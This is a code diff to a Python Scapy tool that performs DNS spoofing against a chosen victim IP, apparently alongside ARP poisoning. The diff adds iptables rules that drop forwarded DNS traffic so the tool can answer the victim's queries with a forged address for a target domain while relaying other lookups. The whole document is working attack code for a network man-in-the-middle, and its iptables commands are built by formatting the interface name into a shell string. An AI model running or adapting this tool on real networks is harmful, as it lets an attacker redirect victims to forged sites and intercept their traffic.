@@ -2,19 +2,46 @@ from scapy.all import *
 from arp import * 
 from helper import *
 import traceback
+import subprocess
+import os
 
 class dns:
     @staticmethod    
-    def set_ip_forwarding(ip_forwarding):
+    def set_ip_forwarding(ip_forwarding, interface):
         """
         Sets the ip forwarding setting, enable or disable it
+        Also adds or deletes the correct firewall forwarding rules
         """
         if ip_forwarding:
             print("Enabling IP forwarding")
             os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+            dns.run_iptables_command("sudo iptables -I FORWARD 1 -p udp --dport 53 -j DROP")
+            dns.run_iptables_command("sudo iptables -I FORWARD 2 -i %s -o %s -j ACCEPT" % (interface, interface))
+            dns.run_iptables_command("sudo iptables -I FORWARD 3 -o %s -i %s -j ACCEPT" % (interface, interface))
+            
         else:
             print("Disabling IP forwarding")
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            try:
+                dns.run_iptables_command("sudo iptables -D FORWARD -i %s -o %s -j ACCEPT" % (interface, interface))
+                dns.run_iptables_command("sudo iptables -D FORWARD -o %s -i %s -j ACCEPT" % (interface, interface))
+                dns.run_iptables_command("sudo iptables -D FORWARD -p udp --dport 53 -j DROP")
+            except Exception as e:
+                print("WARNING: could not remove iptables rules, manual cleanup required")
+                raise
+
+    @staticmethod
+    def run_iptables_command(command):
+        """
+        Function to execute iptables commands, with error handling
+        """
+        try:
+            result = subprocess.check_call(command, shell=True)
+        except subprocess.CalledProcessError as e:
+            print("error executing command: '%s', manually add or remove rule" % command)
+            raise
+        except Exception as e:
+            raise
 
     @staticmethod
     def send_spoof_packet(packet, domain, spoofed_ip):
@@ -46,14 +73,13 @@ class dns:
         
         res = sr1(forward_request, timeout=2, verbose=False)
         if res and res.haslayer(DNS) and res[DNS].qr == 1:
-            res.show()
             victim_response = (
                 IP(dst=packet[IP].src, src=packet[IP].dst) /
                 UDP(dport=packet[UDP].sport, sport=53) /
                 res[DNS]
             )
+            print("Received response for %s, forwarding to victim" % domain)
             send(victim_response, verbose=False)
-            print("response send to %s" % (victim_response[IP].dst))
 
 
     @staticmethod
@@ -65,7 +91,7 @@ class dns:
         if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and packet[IP].src == victim_ip:
             # packet is a DNS request packet
             query_domain = packet.getlayer(DNS).qd.qname.decode('utf-8').rstrip('.')
-            print("DNS query received from %s for %s" % (packet[IP].src, query_domain))
+            print("DNS query received from %s for %s (%s)" % (packet[IP].src, query_domain, "To be spoofed" if domain == query_domain else "Not spoofed"))
 
             if query_domain == domain:
                 # request if for domain to be spoofed
@@ -74,7 +100,6 @@ class dns:
                 
             else:
                 # Request is for domain that should not be spoofed so get legitimate IP
-                print("Got non-spoofed DNS query for domain %s" % query_domain)
                 dns.request_domain(query_domain, packet)
                 
         elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
@@ -85,7 +110,7 @@ class dns:
     def spoof(interface, domain, victim_ip, spoofed_ip):
         print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
         try:
-            dns.set_ip_forwarding(True)
+            dns.set_ip_forwarding(True, interface)
             conf.route.resync()
             router_ip = conf.route.route("0.0.0.0")[2]
             print("Router ip: %s" % router_ip)
@@ -100,7 +125,7 @@ class dns:
             traceback.print_exc()
             
         finally:
-            dns.set_ip_forwarding(False)
+            dns.set_ip_forwarding(False, interface)
             print("DNS spoofing stopped")
             
             
